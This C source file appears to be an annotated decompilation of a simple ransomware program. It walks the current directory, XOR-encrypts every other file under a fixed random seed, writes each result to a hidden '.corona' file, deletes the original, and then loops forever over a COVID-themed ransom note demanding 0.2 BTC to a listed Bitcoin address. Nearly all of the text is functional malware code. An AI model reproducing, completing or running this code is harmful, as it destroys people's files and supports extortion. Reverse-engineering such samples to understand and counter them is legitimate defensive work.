#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>  

// Checks if the filetype of the filename is a file.
bool is_file(char* filename);

void set_corresponding_encrypted_filename(char* filename, ulong* param_2) {
  char cVar1;
  ulong uVar2 = 0xffffffffffffffff;
  ulong *puVar3 = param_2;
  int bVar4 = 0;
  *(long *) param_2 = 0x2f2e; // store 0x2f2e ("/.") at the address pointed to by param_2
  *(long *)((long)param_2 + 2) = 0; // store 0 ("\0") NUL byte at the address of param_2 + 2.

  strcat((char *)param_2, filename); // param_2 += filename
  do {
    if (uVar2 == 0) break;
    uVar2--;
    cVar1 = *(char *)puVar3;
    puVar3 = (ulong *)((long)puVar3 + (ulong)bVar4 * -2 + 1);
  } while (cVar1 != '\0'); // while not NUL (end of line)

  *(long *)((long)param_2 + (~uVar2 - 1)) = 0x616e6f726f632e;
  return;
}

// https://refspecs.linuxbase.org/LSB_3.1.0/LSB-generic/LSB-generic/baselib--io-getc-3.html
// Read the next character from the file pointer. Returns it as an unsigned char casted to an int.
int _IO_getc(_IO_FILE * __fp);

int main(int argc,char **argv)

{
  int temp_var;
  int end_of_file_indicator_set;
  size_t arg_zero_length;
  DIR *working_directory;
  FILE *original_file_stream;
  FILE *encrypted_file_stream;
  struct dirent *current_file;
  long in_FS_OFFSET;
  ulong encrypted_filename_addr = 0x20;
  char program_name [56];
  srand(0xdeadbeef);  // set the random seed
  int seeded_random_value = rand();
  arg_zero_length = strlen(*argv);
  strncpy(program_name,*argv + 2,arg_zero_length); // copy value of arg0 minus './' to local_48
  working_directory = opendir(".");
  if (working_directory != NULL) {
    while (current_file = readdir(working_directory), current_file != NULL) {
      temp_var = strcmp(current_file->d_name,program_name); // 0 if equal
                                                         // positive if current_file is greater than program_name
                                                         // negative if current_file is less than program_name
      if ((temp_var != 0) && (temp_var = is_file(current_file->d_name), temp_var != 0)) {
        // If the name of the current_file didn't match the program name
        // and if the file type of the current_file is a file... then.
        original_file_stream = fopen(current_file->d_name,"rb");
        set_corresponding_encrypted_filename(current_file->d_name,&encrypted_filename_addr);
        encrypted_file_stream = fopen((char *)&encrypted_filename_addr,"w");
        while (temp_var = feof(original_file_stream), temp_var == 0) {
          temp_var = _IO_getc(original_file_stream); // fetch next char (as int) from stream
          end_of_file_indicator_set = feof(original_file_stream);
          if (end_of_file_indicator_set == 0) {
            // end-of-file indicator is not set.
            // write character to stream.
            fputc((int)(char)((int)temp_var ^ (int)(seeded_random_value % 0xff)), encrypted_file_stream);
          }
        }
        fclose(original_file_stream); // close the handle to the file stream
        remove(current_file->d_name); // remove the original file
        fclose(encrypted_file_stream); // close the handle to the file stream
      }
      encrypted_filename_addr = encrypted_filename_addr & 0xffffffffffffff00;
    }
    closedir(working_directory);
  }
  do {
    puts(
        "\x1b[31;1m HAHAHAHHAHAHHAHAHHAHAHAHAHAHHAHAHAHAHHAHHAHAHAHAHHAHAHAHAHAAHHAHAHHAHAAHHAHAHAHA HHA \x1b[0m"
        );
    puts(
        "\x1b[31;1m HAHAHAHHAHAHHAHAHHAHAHAHAHAHHAHAHAHAHHAHHAHAHAHAHHAHAHAHAHAAHHAHAHHAHAAHHAHAHAHA HHA \x1b[0m"
        );
    puts(
        "\x1b[31;1m HAHAHAHHAHAHHAHAHHAHAHAHAHAHHAHAHAHAHHAHHAHAHAHAHHAHAHAHAHAAHHAHAHHAHAAHHAHAHAHA HHA \x1b[0m"
        );
    puts(
        "\x1b[31;1m HAHAHAHHAHAHHAHAHHAHAHAHAHAHHAHAHAHAHHAHHAHAHAHAHHAHAHAHAHAAHHAHAHHAHAAHHAHAHAHA HHA \x1b[0m"
        );
    puts(
        "\x1b[31;1m HAHAHAHHAHAH                                                             AHAHAHA HHA \x1b[0m"
        );
    puts(
        "\x1b[31;1m HAHAHAHHAHAH      SO YOU THOUGHT COVID-19 IS ONLY A HUMAN\'S VIRUS?       AHAHAH AHHA \x1b[0m"
        );
    puts(
        "\x1b[31;1m HAHAHAHHAHAH                                                             AHAHAHA HHA \x1b[0m"
        );
    puts(
        "\x1b[31;1m HAHAHAHHAHAHHAHAHHAHAHAHAHAHHAHAHAHAHHAHHAHAHAHAHHAHAHAHAHAAHHAHAHHAHAAHHAHAHAHA HHA \x1b[0m"
        );
    puts(
        "\x1b[31;1m HAHAHAHHAHAHHAHAHHAHAHAHAHAHHAHAHAHAHHAHHAHAHAHAHHAHAHAHAHAAHHAHAHHAHAAHHAHAHAHA HHA \x1b[0m"
        );
    puts(
        "\x1b[31;1m HAHAHAHHAHAHHAHAHHAHAHAHAHAHHAHAHAHAHHAHHAHAHAHAHHAHAHAHAHAAHHAHAHHAHAAHHAHAHAHA HHA \x1b[0m"
        );
    puts(
        "\x1b[31;1m HAHAHAHHAHAHHAHAHHAHAHAHAHAHHAHAHAHAHHAHHAHAHAHAHHAHAHAHAHAAHHAHAHHAHAAHHAHAHAHA HHA \x1b[0m"
        );
    puts(
        "\x1b[31;1m HAHAHAHHAHAH                                                             AHAHAHA HHA \x1b[0m"
        );
    puts(
        "\x1b[31;1m HAHAHAHHAHAH     NOW TRANSFER 0.2 BTC TO THE FOLLOWING BITCOIN ADDRESS   AHAHAHA HHA \x1b[0m"
        );
    puts(
        "\x1b[31;1m HAHAHAHHAHAH                 TO GET YOUR FILES BACK                      AHAHAHA HHA \x1b[0m"
        );
    puts(
        "\x1b[31;1m HAHAHAHHAHAH         BTC : 1PC9aZC4hNX2rmmrt7uHTfYAS3hRbph4UN            AHAHAHA HHA \x1b[0m"
        );
    puts(
        "\x1b[31;1m HAHAHAHHAHAH                                                             AHAHAHA HHA \x1b[0m"
        );
    puts(
        "\x1b[31;1m HAHAHAHHAHAHHAHAHHAHAHAHAHAHHAHAHAHAHHAHHAHAHAHAHHAHAHAHAHAAHHAHAHHAHAAHHAHAHAHA HHA \x1b[0m"
        );
    puts(
        "\x1b[31;1m HAHAHAHHAHAHHAHAHHAHAHAHAHAHHAHAHAHAHHAHHAHAHAHAHHAHAHAHAHAAHHAHAHHAHAAHHAHAHAHA HHA \x1b[0m"
        );
    puts(
        "\x1b[31;1m HAHAHAHHAHAHHAHAHHAHAHAHAHAHHAHAHAHAHHAHHAHAHAHAHHAHAHAHAHAAHHAHAHHAHAAHHAHAHAHA HHA \x1b[0m"
        );
    sleep(1);
    system("clear");
  } while( 1 );
}
